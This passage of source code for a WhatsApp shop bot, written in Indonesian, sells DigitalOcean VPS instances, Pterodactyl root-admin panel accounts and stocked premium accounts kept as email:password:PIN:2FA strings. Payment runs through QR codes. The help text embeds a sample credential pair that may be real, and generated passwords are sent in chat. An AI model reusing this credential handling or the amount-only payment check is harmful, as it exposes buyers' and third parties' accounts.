            text: `⚠️ *Proses pembelian sebelumnya belum selesai!*\n\nKetik *${prefix}batalbeli* untuk membatalkan.`,
        });
    }

    // QR Creation Process
    const Pay = new Saweria(db_saweria);
    const expirationTime = new Date(Date.now() + 10 * 60 * 1000);
    let res;
    try {
        res = await Pay.createPayment(amount, `VPS Purchase - ${amount}`, {
            expired_at: expirationTime.toISOString(),
        });
    } catch (error) {
        return await yilzi.sendMessage(m.chat, {
            text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${error.message}`,
        });
    }

    if (!res.status) {
        return await yilzi.sendMessage(m.chat, {
            text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${res.msg}`,
        });
    }

    fs.writeFileSync(
        `./src/gateway/${m.sender.split("@")[0]}.json`,
        JSON.stringify(
            {
                number: m.sender,
                id: res.data.id,
                expiredAt: expirationTime.toISOString(),
            },
            null,
            3
        )
    );

    const teks = `
📄 *INFO PEMBAYARAN VPS*

🎮 *Layanan*: VPS
💰 *Total Pembayaran*: Rp ${amount.toLocaleString("id-ID")}
📆 *Batas Waktu*: ${expirationTime.toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
    })} WIB
🆔 *ID Pembayaran*: ${res.data.id}

📌 *Catatan*: 
1️⃣ QR berlaku hanya untuk 1 kali transfer.
2️⃣ QR akan kedaluwarsa dalam 10 menit.
3️⃣ Setelah transfer, tunggu beberapa saat hingga status diperbarui otomatis.

🛑 Jika ingin membatalkan, ketik *${prefix}batalbeli*.
📞 Untuk bantuan, hubungi *${prefix}owner*.
`;

    await yilzi.sendMessage(
        m.chat,
        {
            image: Buffer.from(res.data.qr_image.split(",")[1], "base64"),
            caption: teks,
        },
        { quoted: m }
    );

    let status = false;
    const maxAttempts = 600;
    let attempts = 0;

    while (!status && attempts < maxAttempts) {
        await sleep(1000);
        attempts++;

        if (new Date() > expirationTime) {
            fs.unlinkSync(`./src/gateway/${m.sender.split("@")[0]}.json`);
            return await yilzi.sendMessage(m.chat, {
                text: `❌ *Waktu pembayaran habis.*\nSilakan coba lagi.`,
            });
        }

        let check = await Pay.checkPayment(res.data.id);
        status = check.status;

        if (status) {
            fs.unlinkSync(`./src/gateway/${m.sender.split("@")[0]}.json`);
            await yilzi.sendMessage(m.chat, {
                text: `*Memproses pembuatan VPS Digital Ocean...*`,
            });
            break;
        }
    }

    if (!status) {
        return await yilzi.sendMessage(m.chat, {
            text: `❌ Pembayaran tidak selesai dalam waktu 10 menit. Silakan coba lagi.`,
        });
    }

    // VPS Creation Process
    try {
        let dropletData = {
            name: `root`,
            region: "sgp1",
            size: Obj.images,
            image: "ubuntu-22-04-x64",
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ["T"],
        };

        const password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`;

        const response = await fetch("https://api.digitalocean.com/v2/droplets", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Authorization: `Bearer ${API_TOKEN}`,
            },
            body: JSON.stringify(dropletData),
        });

        const responseData = await response.json();

        if (response.ok) {
            const dropletId = responseData.droplet.id;

            await m.reply("Memproses pembuatan VPS...");
            await sleep(60000);

            const dropletResponse = await fetch(
                `https://api.digitalocean.com/v2/droplets/${dropletId}`,
                {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json",
                        Authorization: `Bearer ${API_TOKEN}`,
                    },
                }
            );

            const dropletDetails = await dropletResponse.json();
            const ipVPS =
                dropletDetails.droplet.networks.v4.length > 0
                    ? dropletDetails.droplet.networks.v4[0].ip_address
                    : "IP tidak tersedia";

            await yilzi.sendMessage(m.chat, {
                text: `VPS berhasil dibuat!\n\nID: ${dropletId}\nIP VPS: ${ipVPS}\nPassword: ${password}`,
            });
        } else {
            throw new Error(responseData.message);
        }
    } catch (err) {
        console.error(err);
        await m.reply(`Terjadi kesalahan saat membuat VPS: ${err.message}`);
    }
}
break
case "cekvps": {
let dropletId = args[0];
if (!dropletId) return reply('ID droplet belum diberikan.');

try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${API_TOKEN}`,
},
});
const dropletResponse = await axios.get(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
headers: {
Authorization: `Bearer ${API_TOKEN}`,
},
});

if (accountResponse.status === 200 && dropletResponse.status === 200) {
const dropletInfo = dropletResponse.data.droplet;
const info = {
dropletid: dropletInfo.id,
username: dropletInfo.name,
ip: dropletInfo.networks.v4[0]?.ip_address || 'N/A',
ram: `${dropletInfo.memory} MB`,
os: dropletInfo.image.distribution,
cpu: `${dropletInfo.vcpus} vCPU`,
storage: dropletInfo.disk,
status: dropletInfo.status
};

const text = `*[ - ] 🌐 YOUR VPS DETAILS [ - ]*
-⪼ Droplet Id: ${info.dropletid}
-⪼ Hostname: ${info.username}
-⪼ IPv4: ${info.ip}
-⪼ RAM: ${info.ram}
-⪼ OS: ${info.os}
-⪼ CPU: ${info.cpu}
-⪼ Storage: ${info.storage} GB
-⪼ Status: ${info.status}

*-# Terima Kasih Telah Memakai Bot WhatsApp*`;

await yilzi.sendMessage( m.chat, { image: { url: "https://files.catbox.moe/d6zzsj.jpg" }, 
caption: text }, { quoted: qloc }
);
} else {
throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
}
} catch (error) {
console.error('Error:', error);
reply(`Error: ${error.message}`);
}
break;
}
break
case "listdroplet": {
if (!isCreator) return m.reply("*[ System Notice ]* Anda bukan pemilik.");
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + API_TOKEN
}
});
const data = await response.json();
return data.droplets || [];
} catch (error) {
reply('Error fetching droplets: ' + error);
return [];
}};
getDroplets().then(droplets => {
let totalvps = droplets.length;

if (droplets.length === 0) {
mesej += 'Tidak ada Droplet yang tersedia.';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
let mesej = `*-# Your Detail List Vps*
*-# ID DROPLET :* ${droplet.id}
*-# Hostname :* ${droplet.name}
*-# Username Login :* root
*-# IP ANDDRES :* ${ipAddress}

*[-] Detail Ram Cpu Os [-]*
*-# Ram :* ${droplet.memory} MB
*-# Cpu :* ${droplet.vcpus} CPU
*-# OS :* ${droplet.image.distribution}
*-# Storage :* ${droplet.disk} GB
*-# Status :* ${droplet.status}\n\n`;
yilzi.sendMessage( m.chat, { image: { url: "https://files.catbox.moe/d6zzsj.jpg" }, caption: mesej }, { quoted: qloc });
});
}
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}}
break
case "deldroplet": {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, command ini hanya untuk pemilik.');
let dropletId = args[0];
if (!dropletId) return reply('*[ System Notice ]* -# ID droplet belum diberikan.');
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${API_TOKEN}`
}
});
if (response.ok) {
m.reply(`*✅️Sukses Delete Vps Digital Ocean*\n📚 ID : ${dropletId}`);
} else {
const errorData = await response.json();
throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
}} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
break;
}
//-# Fitur Auto Order Otomatis -#//
break
case 'addstock': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, fitur ini hanya untuk owner.');
const [idProduk, accountDetails] = text.split(' ').map(item => item.trim());
if (!idProduk || !accountDetails) {
return m.reply("`[ Contoh ]` .addstock code Email:Password:Profil:Pin:Af2\n`[ Valid Code ]` .addstock asbp1 fahrihosting@gmail.com:Fahri@ali:Bebas:Bebasjika Ada:Code A2fnya");
}
addStock(idProduk, accountDetails);
}
break
case 'addproduk': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, command ini hanya untuk pemilik.');
if (!text) return m.reply("`[ Contoh ]` .addproduk code|nama|Harga|deskripsi");

const [kode, nama, hargaStr, deskripsi] = text.split('|').map(item => item.trim());
const harga = parseInt(hargaStr);

if (!kode || !nama || isNaN(harga) || !deskripsi) {
return m.reply("`[ Contoh ]` .addproduk sp1b|Spotify|5000|Akun Spotify Premium 1Bulan");
}

let produkList = [];
try {
if (!fs.existsSync('src/data/produk.json')) {
fs.writeFileSync('src/data/produk.json', JSON.stringify([]), 'utf8');
}
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data) || [];
} catch (err) {
console.error(err);
return m.reply('Terjadi kesalahan saat membaca data produk.');
}
if (!Array.isArray(produkList)) {
produkList = [];
}
if (produkList.some(p => p.id === kode)) {
return m.reply(`Produk dengan kode ${kode} sudah ada. Gunakan kode yang berbeda.`);
}
const newProduk = {
id: kode,
nama: nama,
harga: harga,
deskripsi: deskripsi,
snk: 'Syarat dan Ketentuan Berlaku',
terjual: 0
};

produkList.push(newProduk);

try {
fs.writeFileSync('src/data/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
fs.writeFileSync(`src/data/${kode}.json`, JSON.stringify([]), 'utf8');

m.reply(`Produk berhasil ditambahkan:\n- Kode: ${kode}\n- Nama: ${nama}\n- Harga: ${harga}\n- Deskripsi: ${deskripsi}`);
} catch (err) {
console.error(err);
m.reply('Gagal menambahkan produk. Terjadi kesalahan.');
}
}
break
case 'checkstock': {
if (!isCreator) return m.reply(`*[ System Notice ]* Khusus Owner`)
if (!text) return m.reply("`[ Contoh ]` .checkstock code");

let produkList = [];
try {
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error(err);
return m.reply('Terjadi kesalahan saat membaca data produk.');
}

const produk = produkList.find(p => p.id === text);
if (!produk) {
return m.reply(`Produk dengan kode ${text} tidak ditemukan.`);
}
const stockFilePath = `src/data/${text}.json`;
let existingStock = [];
try {
const stockData = fs.readFileSync(stockFilePath, 'utf8');
existingStock = JSON.parse(stockData) || [];
} catch (err) {
console.error(err);
return m.reply(`Gagal membaca stok untuk produk ${text}.`);
}
const stockInfo = 
`*📦 INFORMASI STOK*\n` +
`*-# Produk: ${produk.nama}* (${text})\n` +
`*-# Harga: Rp ${produk.harga.toLocaleString()}*\n` +
`*-# Total Stok: ${existingStock.length}*\n` +
`*-# Deskripsi: ${produk.deskripsi}*\n` +
`*-# Sudah Terjual: ${produk.terjual || 0}*`;

m.reply(stockInfo);
}
break
case 'delstock': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, command ini hanya untuk pemilik.');
if (!text) return m.reply("`[ Contoh ]` .delstock code Jumlah");

const [kode, jumlahStr] = text.split(' ');
const jumlah = parseInt(jumlahStr);

if (!kode || isNaN(jumlah) || jumlah <= 0) {
return m.reply("`[ Contoh ]` .delstock code jumlah");
}
let produkList = [];
try {
const data = fs.readFileSync('src/data/produk.json', 'utf8');
produkList = JSON.parse(data);
} catch (err) {
console.error(err);
return m.reply('*[ System Notice ]* Terjadi kesalahan saat membaca data produk.');
}

const produk = produkList.find(p => p.id === kode);
if (!produk) {
return m.reply(`*[ System Notice ]* Produk dengan kode ${kode} tidak ditemukan.`);
}
const stockFilePath = `src/data/${kode}.json`;
let existingStock = [];
try {
const stockData = fs.readFileSync(stockFilePath, 'utf8');
existingStock = JSON.parse(stockData) || [];
} catch (err) {
console.error(err);
return m.reply(`*[ System Notice ]* Gagal membaca stok untuk produk ${kode}.`);
}
if (existingStock.length < jumlah) {
return m.reply(`*[ System Notice ]* Stok tidak mencukupi. Saat ini tersedia ${existingStock.length} stok untuk produk ${kode}.`);
}
const remainingStock = existingStock.slice(jumlah);

try {
fs.writeFileSync(stockFilePath, JSON.stringify(remainingStock, null, 4), 'utf8');
const responseMessage = 
`🗑️ Stok Berhasil Dihapus\n` +
`*-# Produk: ${produk.nama} (${kode})*\n` +
`*-# Jumlah Stok Dihapus: ${jumlah}*\n` +
`*-# Sisa Stok: ${remainingStock.length}*

*[-] ✔️ Jangan Lupa Beli Produk Kami [-]*`;

m.reply(responseMessage);
} catch (err) {
console.error(err);
m.reply('Gagal menghapus stok. Terjadi kesalahan.');
}
}

break;
case 'editstock': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, fitur ini hanya untuk owner.');

const [idProduk, oldAccountDetails, newAccountDetails] = text.split(' ').map(item => item.trim());

if (!idProduk || !oldAccountDetails || !newAccountDetails) {
return m.reply("`[ Contoh ]` .editstock code <lama email>:<lama password> <baru email>:<baru password>:<baru profil>:<baru pin>:<baru 2FA>\n" +
"`[ Valid Code ]` .editstock asbp1 fahrihosting@gmail.com:Fahri@ali anothermail@gmail.com:NewPass:Profile:NewPin:NewCode"
);
}

editStock(idProduk, oldAccountDetails, newAccountDetails);
}
break;
case 'editproduk': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, fitur ini hanya untuk owner.');

const [kode, ...updateParts] = text.split('|').map(item => item.trim());
if (!kode || updateParts.length === 0) {
return m.reply("`[ Contoh ]` .editproduk code|nama|harga|deskripsi\nCatatan: Isi dengan data baru, kosongkan bagian yang tidak ingin diubah\n`[ Valid Code ]` .editproduk sp1b|Spotify Premium|7000|Akun Spotify Premium 1 Bulan Terbaru"
);
}
const updateData = {
nama: updateParts[0] || undefined,
harga: updateParts[1] ? parseInt(updateParts[1]) : undefined,
deskripsi: updateParts[2] || undefined,
snk: updateParts[3] || undefined
};

editProduk(kode, updateData);
}
break;
case 'stock': {
try {
if (!fs.existsSync('src/data/produk.json')) {
return m.reply('Belum ada produk yang tersedia.');
}
const produkData = fs.readFileSync('src/data/produk.json', 'utf8');
const produkList = JSON.parse(produkData) || [];
if (produkList.length === 0) {
return m.reply('Belum ada produk yang tersedia.');
}
let semuaPesanProduk = `*╭────〔 CARA MEMBELI 〕─*
*┊・* Untuk Membeli Ketik Perintah Berikut
*┊・* #stok (untuk melihat stok tersedia)
*┊・* #buy Kode JumlahAkun
*┊・* Contoh: .buy dopaypal 1
*┊・* Contoh: .buy docc 1
*┊・* Pastikan Code & Jumlah Akun di Ketik dengan benar
*┊・* Pertanyaan / ada kendala Hub Admin: https://wa.me/6282245415403
*╰┈┈┈┈┈┈┈┈*\n\n`;
for (const produk of produkList) {
let stokProduk = [];
try {
if (fs.existsSync(`src/data/${produk.id}.json`)) {
const stokData = fs.readFileSync(`src/data/${produk.id}.json`, 'utf8');
stokProduk = JSON.parse(stokData) || [];
}
} catch (stokError) {
console.error(`Gagal membaca stok untuk ${produk.id}:`, stokError);
}
const sisaStok = stokProduk.length;
semuaPesanProduk += `*╭────〔 ${produk.nama.toUpperCase()} 〕*
*┊・Kode*: ${produk.id}
*┊・Deskripsi*: ${produk.deskripsi}
*┊・Harga*: Rp ${produk.harga.toLocaleString('id-ID')}
*┊・Sisa Stok*: ${sisaStok}
*┊・Terjual*: ${produk.terjual || 0}
*╰┈┈┈┈┈┈┈┈*\n\n`;
}
yilzi.sendMessage(m.chat, { image: { url: "https://img100.pixhost.to/images/443/537851172_fahri-official.jpg" }, caption: semuaPesanProduk }, { quoted: qloc });
} catch (err) {
console.error('Kesalahan saat menampilkan daftar produk:', err);
m.reply('Terjadi kesalahan saat menampilkan daftar produk.');
}}
break
case "delproduk": {
if (!isCreator) {
return m.reply('*[ System Notice ]* Maaf, fitur ini hanya untuk owner.');
}
if (!text) {
return m.reply(
"`[ Contoh ]` .delproduk code\n" +
"Catatan: Masukkan kode produk yang ingin dihapus\n" +
"`[ Valid Code ]` .delproduk sp1b"
);
}
const kode = text.trim();
delProduk(kode, m);
}
//-# Fitur Auto order -# //
break;
case 'buyadminpanel': {
    if (m.isGroup) {
        return m.reply("*[ System Notice ]* Pembelian admin panel Pterodactyl hanya bisa dilakukan di private chat.");
    }

    const adminPackages = {
        "1bulan": { level: "1bulan Admin", access: "Limited", harga: 25000 },
        "permanen": { level: "Permanen Admin", access: "Limited", harga: 40000 },
    };

    const detailPaket = `
*#- Detail Paket Admin Panel Tersedia*
* 1bulan (Rp. 25.000)
* Permanen (Rp. 40.000)

*#- Selalu berhati-hati saat melakukan transaksi. Terima kasih!*
`;

    if (!text) return m.reply(detailPaket);

    const cmd = text.toLowerCase();
    const selectedPackage = adminPackages[cmd] || null;

    if (!selectedPackage) return m.reply(detailPaket);

    try {
        const amount = selectedPackage.harga;
        const fee = Math.floor(Math.random() * 10);
        const totalAmount = amount + fee;

        const filePath = `./src/gateway/${m.sender.split("@")[0]}.json`;
        if (fs.existsSync(filePath)) {
            return yilzi.sendMessage(m.chat, {
                text: `⚠️ *Proses pembelian sebelumnya belum selesai!*\n\nKetik *${prefix}batalbeli* untuk membatalkan.`,
            });
        }

        const expirationTime = new Date(Date.now() + 10 * 60 * 1000); // 10 menit
        const formattedExpirationTime = expirationTime.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

        // Membuat pembayaran Saweria
        const Pay = new Saweria(db_saweria);
        const paymentResponse = await Pay.createPayment(totalAmount, `Pembelian ${selectedPackage.level}`, {
            expired_at: expirationTime.toISOString(),
        });

        if (!paymentResponse.status) {
            return yilzi.sendMessage(m.chat, {
                text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${paymentResponse.msg}`,
            });
        }

        // Simpan informasi pembayaran ke file
        fs.writeFileSync(filePath, JSON.stringify({
            number: m.sender,
            id: paymentResponse.data.id,
            expiredAt: expirationTime.toISOString(),
        }, null, 2));

        // Kirim informasi pembayaran dan QR Saweria
        const paymentDetails = `
📄 *INFO PEMBAYARAN ADMIN PANEL*

💳 *Layanan*: ${selectedPackage.level}
💰 *Total Pembayaran*: Rp ${totalAmount.toLocaleString('id-ID')}
📆 *Batas Waktu*: ${formattedExpirationTime} WIB
🆔 *ID Pembayaran*: ${paymentResponse.data.id}

📌 *Catatan*: 
1️⃣ QR berlaku hanya untuk 1 kali transfer.
2️⃣ QR akan kedaluwarsa dalam 10 menit.
3️⃣ Setelah transfer, tunggu beberapa saat hingga status diperbarui otomatis.

🛑 Jika ingin membatalkan, ketik *${prefix}batalbeli*.
📞 Untuk bantuan, hubungi *${prefix}owner*.
`;

        await yilzi.sendMessage(m.chat, {
            image: Buffer.from(paymentResponse.data.qr_image.split(",")[1], "base64"),
            caption: paymentDetails,
        }, { quoted: m });

        // Proses pengecekan pembayaran
        let paymentStatus = false;
        const maxAttempts = 600; // Maksimum 10 menit
        let attempts = 0;

        while (!paymentStatus && attempts < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Tunggu 1 detik
            attempts++;

            if (new Date() > expirationTime) {
                fs.unlinkSync(filePath);
                return yilzi.sendMessage(m.chat, {
                    text: `❌ *Waktu pembayaran habis.*\nSilakan coba lagi.`,
                });
            }

            const check = await Pay.checkPayment(paymentResponse.data.id);
            paymentStatus = check.status;

            if (paymentStatus) {
                fs.unlinkSync(filePath);

                // Membuat Admin Panel
                await createAdminPanel(selectedPackage, m, totalAmount);
                break;
            }
        }

        // Hentikan proses jika waktu habis
        setTimeout(() => {
            if (!paymentStatus) {
                fs.unlinkSync(filePath);
                yilzi.sendMessage(m.chat, {
                    text: `❌ *Waktu pembayaran habis.*\nSilakan coba lagi.`,
                });
            }
        }, 10 * 60 * 1000);

    } catch (err) {
        console.error('Pembelian Error:', err);
        m.reply("❌ Terjadi kesalahan. Silakan coba lagi.");
    }
    break;
}

async function createAdminPanel(selectedPackage, m, totalAmount) {
    try {
        const username = m.sender.split('@')[0];
        const email = `${username}@gmail.com`;
        const name = `Admin${Math.random().toString(36).substring(2, 7)}`;
        const password = `admin${Math.random().toString(36).substring(2, 8)}`;

        const response = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password,
            }),
        });

        const data = await response.json();
        if (data.errors) throw new Error(data.errors[0].detail);

        const user = data.attributes;
        const tekspanel = `
*[-] Berhasil Membuat Akun Admin Panel ✅ [-]*

* *-# Nama :* ${name}
* *-# Username :* ${user.username}
* *-# Password :* ${password}
* *-# Level Akses :* ${selectedPackage.level}
* *-# Login :* ${domain}
* *Expired Akses :* Permanen

*[ - ] Rules Pembelian Admin Panel ⚠️ [ - ]*
1️⃣ Simpan data ini baik-baik. 
2️⃣ Data hilang/lupa akun, seller tidak bertanggung jawab.
3️⃣ Garansi aktif 10 hari (1x replace).
`;

        await yilzi.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/ld1o34.jpg' },
            caption: tekspanel,
        }, { quoted: m });
    } catch (err) {
        console.error('Admin Panel Creation Error:', err);
        await yilzi.sendMessage(m.chat, {
            text: '❌ Terjadi kesalahan saat membuat admin panel. Silakan hubungi admin.',
        }, { quoted: m });
    }
}

//-# Fitur Add Tutor #-//
case 'addtutor': {
if (!isCreator) return m.reply('*[ System Notice ]* Maaf, command ini hanya untuk pemilik.');
if (!text) return m.reply("`[ Contoh ]` .addtutor code|nama|harga|deskripsi|Link");

const [kode, nama, hargaStr, deskripsi, link] = text.split('|').map(item => item.trim());
const harga = parseInt(hargaStr);

if (!kode || !nama || isNaN(harga) || !deskripsi || !link) {
return m.reply("`[ Contoh ]` .addtutor sp1b|Spotify|5000|Akun Spotify Premium 1Bulan|http://linktutor.com");
}

let produkList = [];
try {
if (!fs.existsSync('src/tutor/produk.json')) {
fs.writeFileSync('src/tutor/produk.json', JSON.stringify([]), 'utf8');
}
const data = fs.readFileSync('src/tutor/produk.json', 'utf8');
produkList = JSON.parse(data) || [];
} catch (err) {
console.error(err);
return m.reply('Terjadi kesalahan saat membaca data produk.');
}

if (!Array.isArray(produkList)) {
produkList = [];
}

// Check if the product with the same code already exists
if (produkList.some(p => p.id === kode)) {
return m.reply(`Produk dengan kode ${kode} sudah ada. Gunakan kode yang berbeda.`);
}

// Create new product object with the additional link
const newProduk = {
id: kode,
nama: nama,
harga: harga,
deskripsi: deskripsi,
link: link,// Added the link here
snk: 'Syarat dan Ketentuan Berlaku'
};

produkList.push(newProduk);

try {
fs.writeFileSync('src/tutor/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
fs.writeFileSync(`src/tutor/${kode}.json`, JSON.stringify([]), 'utf8');

m.reply(`Produk berhasil ditambahkan:\n- Kode: ${kode}\n- Nama: ${nama}\n- Harga: ${harga}\n- Deskripsi: ${deskripsi}\n- Link: ${link}`);
} catch (err) {
console.error(err);
m.reply('Gagal menambahkan produk. Terjadi kesalahan.');
}
}

break
case 'order': {
    const fs = require('fs');
    const moment = require('moment-timezone');

    function retrieveAndRemoveCanvaEntry(filename) {
        try {
            const data = fs.readFileSync(`src/tutor/${filename}`, 'utf8').trim();
            let canvaEntries = [];

            // Parsing data
            try {
                canvaEntries = JSON.parse(data);
            } catch (jsonErr) {
                console.error('JSON Parsing Error:', jsonErr);

                if (data.startsWith('[') && data.endsWith(']')) {
                    const cleanedData = data.replace(/\s+/g, ' ').replace(/,\s*]/g, ']');
                    try {
                        canvaEntries = JSON.parse(cleanedData);
                    } catch (cleanErr) {
                        console.error('Cleaned JSON Parsing Error:', cleanErr);
                        return null;
                    }
                } else {
                    canvaEntries = data.split('\n').filter(line => line.trim() !== '');
                }
            }

            if (!Array.isArray(canvaEntries) || canvaEntries.length === 0) return null;

            const removedEntry = canvaEntries.shift();
            fs.writeFileSync(`src/tutor/${filename}`, JSON.stringify(canvaEntries, null, 4), 'utf8');
            return removedEntry;
        } catch (err) {
            console.error('File Read Error:', err);
            return null;
        }
    }

    function updateSoldCount(idProduk) {
        try {
            const data = fs.readFileSync('src/tutor/produk.json', 'utf8');
            const produkList = JSON.parse(data);

            const produkIndex = produkList.findIndex(produk => produk.id === idProduk);
            if (produkIndex !== -1) {
                produkList[produkIndex].terjual = (produkList[produkIndex].terjual || 0) + 1;
                fs.writeFileSync('src/tutor/produk.json', JSON.stringify(produkList, null, 4), 'utf8');
            }
        } catch (err) {
            console.error('Update Sold Count Error:', err);
        }
    }

    function sendProduk(produk) {
        return `Nama Produk: ${produk.nama}\nDeskripsi: ${produk.link}`;
    }

    const filePath = `./src/gateway/${m.sender.split("@")[0]}.json`;
    if (fs.existsSync(filePath)) {
        return yilzi.sendMessage(m.chat, {
            text: `⚠️ *Proses pembelian sebelumnya belum selesai!*\n\nKetik *${prefix}batalbeli* untuk membatalkan.`,
        });
    }

    try {
        if (!text) return m.reply("`[ Contoh ]` .buy <kode_produk>");
        const [idProduk] = text.split(' ').map(item => item.trim());
        if (!idProduk) return m.reply("`[ Contoh ]` .buy spo1b");

        const produkList = JSON.parse(fs.readFileSync('src/tutor/produk.json', 'utf8'));
        const produk = produkList.find(produk => produk.id === idProduk);
        if (!produk) return m.reply("`[ System Notice ]` Produk tidak ditemukan.\nContoh: .buy spo1b");

        const randomFee = Math.floor(Math.random() * 150);
        const totalAmount = produk.harga + randomFee;

        // Simulasi pembuatan QRIS
        const qrisPayment = await createQrisPayment(totalAmount);
        if (!qrisPayment) return m.reply('Gagal membuat pembayaran QRIS. Silahkan coba lagi.');

        const expirationTime = moment().tz('Asia/Jakarta').add(10, 'minutes').format('HH:mm:ss');
        const qrisMessage = await yilzi.sendMessage(m.chat, {
            image: { url: qrisPayment.qrImageUrl },
            caption: `
*[ INFORMASI TRANSAKSI ]*
○ *Transfer Sebelum*: ${expirationTime}
○ *Harga Barang*: Rp ${produk.harga.toLocaleString()}
○ *Nama Barang*: ${produk.nama}
○ *Total Amount*: Rp ${totalAmount.toLocaleString()}

📌 **Catatan:**
1️⃣ QR hanya valid untuk 1 kali transfer.
2️⃣ Tunggu beberapa saat hingga pembayaran diverifikasi otomatis.
3️⃣ Hubungi *${prefix}owner* untuk bantuan lebih lanjut.
            `,
        });

        // Pengecekan status pembayaran
        const interval = setInterval(async () => {
            const paymentStatus = await checkQrisStatus();
            if (paymentStatus && paymentStatus.amount === totalAmount.toString()) {
                clearInterval(interval);
                await yilzi.sendMessage(m.chat, { delete: qrisMessage.key });

                // Notifikasi pembayaran berhasil
                m.reply(`*[ System Notice ]* Pembayaran Terverifikasi. Dana Masuk: Rp ${totalAmount.toLocaleString()}`);
                m.reply(sendProduk(produk));
                updateSoldCount(idProduk);
            }
        }, 25000);

        // Timeout setelah 10 menit
        setTimeout(async () => {
            clearInterval(interval);
            await yilzi.sendMessage(m.chat, { delete: qrisMessage.key });
            m.reply('❌ Waktu pembayaran habis. Silakan coba lagi.');
        }, 10 * 60 * 1000);
    } catch (err) {
        console.error('Order Error:', err);
        m.reply('❌ Terjadi kesalahan. Silakan coba lagi.');
    }
    break;
}
break
case "qris": {
    if (m.isGroup) return m.reply("Pembelian hanya bisa dilakukan di private chat");
    if (db.users[m.sender].status_deposit) {
        return m.reply("Masih ada transaksi yang belum diselesaikan. Ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");
    }

    const nominal = Number(text); // Nominal deposit
    if (!nominal || nominal <= 0) {
        return m.reply("Nominal tidak valid. Harap masukkan jumlah yang benar, contoh: *.qris* 5000.");
    }

    const filePath = `./src/gateway/${m.sender.split("@")[0]}.json`;
    if (fs.existsSync(filePath)) {
        return yilzi.sendMessage(m.chat, {
            text: `⚠️ *Proses pembelian sebelumnya belum selesai!*\n\nKetik *${prefix}batalbeli* untuk membatalkan.`,
        });
    }

    try {
        const expirationTime = new Date(Date.now() + 10 * 60 * 1000); // 10 menit
        const formattedTime = expirationTime.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });

        // Buat pembayaran
        let Pay = new Saweria(db_saweria);
        const paymentResponse = await Pay.createPayment(nominal, `Pembelian Deposit`, {
            expired_at: expirationTime.toISOString(),
        });

        if (!paymentResponse.status) {
            return yilzi.sendMessage(m.chat, {
                text: `❌ Terjadi kesalahan saat membuat pembayaran:\n${paymentResponse.msg}`,
            });
        }

        // Simpan transaksi
        fs.writeFileSync(filePath, JSON.stringify({
            number: m.sender,
            id: paymentResponse.data.id,
            expiredAt: expirationTime.toISOString(),
        }, null, 2));

        // Kirim informasi pembayaran
        const paymentDetails = `
📄 *INFO PEMBAYARAN DEPOSIT*

💰 *Total*: Rp ${nominal.toLocaleString('id-ID')}
📆 *Batas Waktu*: ${formattedTime} WIB
🆔 *ID Pembayaran*: ${paymentResponse.data.id}

📌 *Catatan*: 
1️⃣ QR berlaku untuk 1 kali transfer.
2️⃣ QR akan kedaluwarsa dalam 10 menit.
3️⃣ Tunggu beberapa saat hingga status diperbarui otomatis.

🛑 Ketik *${prefix}batalbeli* untuk membatalkan.
`;

        await yilzi.sendMessage(m.chat, {
            image: Buffer.from(paymentResponse.data.qr_image.split(",")[1], "base64"),
            caption: paymentDetails,
        }, { quoted: m });

        // Proses pengecekan pembayaran
        let status = false;
        const maxAttempts = 600; // 10 menit
        let attempts = 0;

        while (!status && attempts < maxAttempts) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            attempts++;

            if (new Date() > expirationTime) {
                fs.unlinkSync(filePath);
                return yilzi.sendMessage(m.chat, {
                    text: `❌ *Waktu pembayaran habis.*\nSilakan coba lagi.`,
                });
            }

            const check = await Pay.checkPayment(paymentResponse.data.id);
            if (check.status) {
                fs.unlinkSync(filePath);
                return yilzi.sendMessage(m.chat, {
                    text: `✅ *Pembayaran berhasil!*\nTerima kasih telah melakukan transaksi.`,
                });
            }
        }
    } catch (error) {
        console.error(error);
        m.reply("❌ Terjadi kesalahan saat memproses transaksi.");
    }
    break;
}
case 'login':{
